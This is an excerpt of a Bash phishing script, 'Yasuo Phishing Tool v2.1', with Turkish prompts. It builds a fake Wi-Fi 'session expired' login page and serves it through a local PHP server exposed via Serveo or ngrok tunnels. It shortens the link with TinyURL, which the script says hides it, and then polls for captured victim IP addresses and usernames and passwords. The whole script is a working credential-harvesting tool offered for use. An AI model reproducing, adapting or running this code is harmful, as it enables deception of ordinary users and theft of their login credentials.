...
# Yasuo v2.1
# Coded by: Neowise
# Github: https://github.com/NE0WISE/
...
command -v php > /dev/null 2>&1 || { echo >&2 "Dostum Geri Dön ve Terminaline şunu yaz apt install php."; exit 1; }
command -v curl > /dev/null 2>&1 || { echo >&2 "Dostum Geri Dön ve Terminaline şunu yaz apt install curl."; exit 1; }
...
read -p $'\n\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Seç Birini: \e[0m\en' option
...
printf "\e[1;93m [!] Böyle Bir Şey Yok!\e[0m\n"
sleep 1
clear
menu
fi
...
printf "\e[1;77m  ░ ░           ░  ░      ░     ░         ░ ░    \e[0m\n"
printf "\n"
printf "\e[1;77m\e[41m  Yasuo Phishing Tool v2.1, Coded by: @Neowise  \e[0m\n" #Don't change, noob
printf "\n"
}

createpage() {
default_cap1="Wi-Fi Oturum Süre Doldu"
default_cap2="Lütfen tekrar giriş yapın."
default_user_text="Username:"
default_pass_text="Password:"
default_sub_text="Oturum aç"

read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Title 1 (Default: Wi-Fi Oturum Süre Doldu): \e[0m' cap1
cap1="${cap1:-${default_cap1}}"

read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Title 2 (Default: Lütfen tekrar giriş yapın.): \e[0m' cap2
...
read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Submit field (Default: Oturum aç): \e[0m' sub_text
...
getcredentials() {
printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Henüz Kimlik Bilgilerini Girmedi ...\e[0m\n"
while [ true ]; do


if [[ -e "sites/$server/usernames.txt" ]]; then
printf "\n\e[1;93m[\e[0m*\e[1;93m]\e[0m\e[1;92m Hedef Oltaya Takıldı!\n"
catch_cred
...
##
serverx() {
printf "\e[1;92m[\e[0m*\e[1;92m] Çalışıyor php server...\n"
cd sites/$server && php -S 127.0.0.1:$port > /dev/null 2>&1 & 
sleep 2
printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Çalışıyor server...\e[0m\n"
command -v ssh > /dev/null 2>&1 || { echo >&2 "Dostum Geri Dön ve Terminaline şunu yaz apt install SSH."; exit 1; }
if [[ -e sendlink ]]; then
rm -rf sendlink
fi
...
printf "\n"
printf '\n\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Link hazır:\e[0m\e[1;77m %s \n' $send_link
send_ip=$(curl -s http://tinyurl.com/api-create.php?url=$send_link | head -n1)
printf '\n\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Senin için bağlantıyı gizledim:\e[0m\e[1;77m %s \n' $send_ip
printf "\n"
checkfound
...
printf '\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Seçenek Belirle (Default:\e[0m\e[1;77m %s \e[0m\e[1;92m): \e[0m' $default_port
read port
...
command -v unzip > /dev/null 2>&1 || { echo >&2 "Dostum Geri Dön ve Terminaline şunu yaz apt-get install unzip."; exit 1; }
command -v wget > /dev/null 2>&1 || { echo >&2 "Dostum Geri Dön ve Terminaline şunu yaz apt-install wget."; exit 1; }
...
sleep 2
printf "\e[1;92m[\e[0m*\e[1;92m] Çalışıyor ngrok server...\n"
./ngrok http 3333 > /dev/null 2>&1 &
sleep 10

link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
printf "\e[1;92m[\e[0m*\e[1;92m] Link Hazır:\e[0m\e[1;77m %s\e[0m\n" $link
...
printf "\n"
printf "\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m Serveo.net (SSH Tunnel!)\e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;93m Ngrok\e[0m\n"
default_option_server="1"
read -p $'\n\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Seç Birini: \e[0m\en' option_server
...
printf "\e[1;93m [!] Geçersiz İşlem!\e[0m\n"
sleep 1
clear
start1
fi
...
printf "\n"
printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Henüz kimse Bağlantıya Tıklamadı ...\e[0m\n"
while [ true ]; do


if [[ -e "sites/$server/ip.txt" ]]; then
printf "\n\e[1;92m[\e[0m*\e[1;92m] IP Adresini Buldum!\n"
catch_ip
rm -rf sites/$server/ip.txt
fi
sleep 0.5
if [[ -e "sites/$server/usernames.txt" ]]; then
printf "\n\e[1;93m[\e[0m*\e[1;93m]\e[0m\e[1;92m Kimlik Bilgilerini Buldum!\n"
catch_cred
rm -rf sites/$server/usernames.txt
fi
sleep 0.5
